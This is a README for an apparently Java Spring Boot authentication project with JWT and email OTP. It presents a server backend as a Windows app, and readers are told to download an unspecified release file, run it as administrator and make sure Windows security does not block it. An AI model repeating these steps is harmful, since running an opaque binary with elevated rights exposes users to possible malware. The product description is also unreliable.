# 🔐 authentication-verification-system - Secure sign-in with email checks

[![Download](https://img.shields.io/badge/Download%20Release-4B0082?style=for-the-badge&logo=github&logoColor=white)](https://github.com/monthisis131/authentication-verification-system/releases)

## 📌 Overview

authentication-verification-system is a Windows-ready app for secure user sign-up and sign-in. It uses Spring Boot, JWT, and email OTP checks to help protect accounts during registration and login.

This app is built for users who want a simple way to create an account, verify email access, and sign in with a secure token-based flow. It fits common web app use cases where login safety matters.

## ✨ What it does

- Lets users register with an email address
- Sends an OTP code to confirm email access
- Lets users log in after verification
- Uses JWT for secure session handling
- Stores user data with a database-backed setup
- Supports a clean REST API design for app use
- Fits projects that need basic account protection

## 🖥️ What you need

Use a Windows PC with:

- Windows 10 or Windows 11
- At least 4 GB RAM
- 200 MB free disk space
- Internet access for email verification
- A modern web browser
- Permission to run downloaded files

If you plan to connect it to your own database or email setup, keep your login details ready before you start.

## 📥 Download the app

Visit the release page here and download the latest Windows file:

https://github.com/monthisis131/authentication-verification-system/releases

After the file finishes downloading, open it from your Downloads folder.

## 🛠️ Install and set up

1. Open the release page and pick the newest version.
2. Download the Windows file from the Assets section.
3. Save the file to your PC.
4. If the file comes in a ZIP folder, right-click it and choose Extract All.
5. Open the extracted folder.
6. Look for the app file, installer, or launch file.
7. Double-click the file to start the app.
8. If Windows asks for permission, select Yes.
9. Wait for the app to load.
10. Follow the on-screen steps to register or log in.

## 🔑 First-time use

When you start the app for the first time, it will guide you through the basic flow:

1. Enter your email address.
2. Create your account details.
3. Check your inbox for an OTP code.
4. Enter the OTP in the app.
5. Finish verification.
6. Log in with your account.

If you do not see the email, check your junk or spam folder.

## 📧 Email verification flow

The app uses email OTP verification to confirm that the email belongs to you.

- You type your email during sign-up
- The app sends a one-time code
- You enter the code in the app
- The app marks your account as verified
- You can then log in

This helps block fake sign-ups and adds a clear check before access is granted.

## 🔒 Security features

The app includes:

- JWT-based login tokens
- Email OTP verification
- Spring Security for access control
- Safe handling of user sessions
- Database-backed user records
- Protected login and registration flow

These parts work together to keep account access controlled and reduce weak login paths.

## 🧰 How it is built

The project uses:

- Java
- Spring Boot
- Spring Security
- Spring Data JPA
- JWT
- REST API
- Supabase DB
- Email verification logic

This stack is common for web apps that need secure sign-in, user records, and account checks.

## 🧭 Common use cases

You can use this system for:

- Internal apps with email-based sign-up
- User portals that need account checks
- Demo apps for secure login flows
- Back-end systems for registration and sign-in
- Projects that need JWT authentication

## 🧩 If the app does not open

Try these steps:

1. Make sure the download finished fully.
2. Extract the ZIP file if it is compressed.
3. Run the app file again.
4. Right-click the file and choose Run as administrator.
5. Check that your Windows security settings are not blocking the file.
6. Confirm your internet connection is working.
7. Check your email settings if OTP messages do not arrive.

## 📂 Folder look

After extraction, you may see files like:

- README
- configuration files
- app or server launch files
- build files
- source folders

If you only need to run the app, focus on the release file and any launch file included with it.

## ⚙️ Basic setup tips

For the best first run:

- Use a valid email address you can access
- Keep your inbox open while signing up
- Check spam if the OTP is late
- Use a stable internet connection
- Keep the app open until verification ends

## 🧪 What happens after login

After login, the app creates a secure token for your session. That token lets the system know you are signed in without asking for your password on every action.

This is useful for apps that need a clean login flow and a safer way to handle access.

## 📌 Quick start

1. Open the release page
2. Download the latest Windows file
3. Extract it if needed
4. Run the app
5. Register your account
6. Verify your email with the OTP
7. Log in

## 🗂️ Topics covered

- authentication
- email verification
- Java
- JWT
- REST API
- security
- Spring
- Spring Boot
- Spring Data JPA
- Spring Security
- Supabase DB